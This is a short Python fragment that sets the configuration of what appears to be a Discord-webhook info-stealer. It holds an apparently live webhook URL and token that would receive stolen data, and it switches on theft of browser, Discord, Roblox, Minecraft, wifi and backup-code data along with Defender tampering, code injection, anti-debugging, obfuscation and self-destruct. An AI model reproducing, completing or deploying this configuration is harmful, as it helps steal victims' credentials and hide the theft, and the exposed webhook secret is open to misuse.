...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1139274310943506583/MOXoYhUCDVv11M77kj8m62qUTbI0lfM7U3hg4EQgBdjYxRI7KGtHdesXYOLKkfKMLLX9', 'ping': True, 'pingtype': 'Here', 'error': False, 'startup': False, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': True, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': True}
